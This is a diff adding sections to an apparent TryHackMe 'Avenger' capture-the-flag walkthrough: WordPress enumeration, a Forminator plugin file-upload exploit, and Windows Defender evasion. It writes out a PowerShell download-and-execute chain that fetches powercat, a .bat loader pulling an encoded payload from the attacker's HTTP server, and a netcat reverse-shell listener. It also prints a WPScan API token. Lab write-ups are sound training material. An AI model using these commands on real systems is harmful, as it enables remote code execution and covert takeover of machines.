@@ -85,3 +85,157 @@ PORT     STATE SERVICE       VERSION
 Service Info: Hosts: localhost, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 ```
+
+
+
+## Web Enumeration
+
+<figure><img src="../../../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>
+
+
+
+If we try to enter in the `gift/` directory, the domain will change in this:
+
+<figure><img src="../../../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>
+
+add this domain to `/etc/hosts` to view the site.
+
+Try to enumerate with dir/file discovering.
+
+{% code overflow="wrap" %}
+```bash
+gobuster dir -u http://avenger.tryhackme/gift/ -w /usr/share/wordlists/SecLists_custom/raft-large-directories.txt -b 403,404
+
+/admin                (Status: 302) [Size: 0] [--> http://avenger.tryhackme/gift/wp-admin/]
+/wp-content           (Status: 301) [Size: 357] [--> http://avenger.tryhackme/gift/wp-content/]
+/wp-admin             (Status: 301) [Size: 355] [--> http://avenger.tryhackme/gift/wp-admin/]
+/wp-includes          (Status: 301) [Size: 358] [--> http://avenger.tryhackme/gift/wp-includes/]
+```
+{% endcode %}
+
+### Wordpress Login Brute Forcing
+
+These route bring you to `wp-login` portal.
+
+<figure><img src="../../../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>
+
+Checking with wafw00f tool we can view that the site not has a WAF enabled.
+
+```bash
+wafw00f http://avenger.tryhackme/gift/wp-login.php
+
+[*] Checking http://avenger.tryhackme/gift/wp-login.php
+[+] Generic Detection results:
+[-] No WAF detected by the generic detection # <--
+[~] Number of requests: 7
+```
+
+Trying to enter with a admin:admin credentials we can notice that a message appair, tell us that the user admin exists.
+
+<figure><img src="../../../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>
+
+So, knowing that the site not has WAF enabled and we have already know a user valid, we could do a brute force to guessing the password of admin user.
+
+Nothing found :(
+
+### WPScan
+
+Try to run e WPScan to detect some vulnerability.
+
+{% code overflow="wrap" %}
+```bash
+wpscan --url http://avenger.tryhackme/gift/ --api-token eVAkNLx5URNVNRP2xj1Uxon9CWFslz5Aas8bWb5jcO8 --random-user-agent -v
+```
+{% endcode %}
+
+From this we can notice that the File Upload is managed by Forminator Plugin. That reading from readme of the plugin is not updated.
+
+<figure><img src="../../../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>
+
+Searching online there are some vulnerabilities, but in particulary there is a Unauthentication File Upload and RCE.
+
+{% embed url="https://www.exploit-db.com/exploits/51664" %}
+
+If we upload a file in the form we can see this message.
+
+<figure><img src="../../../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>
+
+This make us think that any files will upload a person will open it. So, we can upload a file to establish a revshell.
+
+### Forminator Plugin RCE - AV Bypass
+
+We can consider that the Windows Server machine has AV Windows Defender enabled.
+
+And if the upload a simple file with a rev shell, this won't works.
+
+Reading this article, we have a method to bypass the AV.
+
+{% embed url="https://systemweakness.com/evade-windows-defender-reverse-shell-detection-6fa9f5eee1d1" %}
+
+{% content-ref url="../../../pt/executive-pt/post-exploitation/shells/shells-for-av-bypass.md" %}
+[shells-for-av-bypass.md](../../../pt/executive-pt/post-exploitation/shells/shells-for-av-bypass.md)
+{% endcontent-ref %}
+
+Follow the above pages we obtained the reverse shell bypassing Windows Defender.
+
+Create the encoded RevShell to host in a Http server.&#x20;
+
+```bash
+LHOST=10.23.52.142
+LPORT=9009
+rshell=shell.txt
+pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > /tmp/$rshell
+```
+
+```bash
+python3 -m http.server 80
+```
+
+Now create the .bat file that will be open by a support user.
+
+```bash
+LHOST=10.23.52.142
+LPORT_web=80
+rshell=shell-9009.txt
+echo START /B powershell -c "\$code=(New-Object System.Net.Webclient).DownloadString('http://${LHOST}:${LPORT_web}/${rshell}');iex 'powershell -E \$code'" >/tmp/backup.bat 
+```
+
+Lastly start a listener
+
+```bash
+rlwrap nc -nlvp 9009
+```
+
+Upload the file and when it will be open we will obtain a RevShell.
+
+<figure><img src="../../../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>
+
+Now we can print the user flag.
+
+```powershell
+more C:\Users\hugo\Desktop\user.txt
+```
+
+
+
+## Privilege Escalation
+
+During the local windows enumeration, we noticed that the user hugo is in the Administrator group
+
+```powershell
+net localgroup administrators
+
+Members
+------------------------
+Administrator
+hugo
+```
+
+
+
+Bypass UAC to run program with Administrator privilege.
+
+{% embed url="https://0xb0b.gitbook.io/writeups/tryhackme/2023/avenger" %}
+
+{% embed url="https://momrulhasan.medium.com/avenger-tryhackme-walkthrough-bypassing-antivirus-and-gaining-full-system-access-01e705b4da92" %}
+
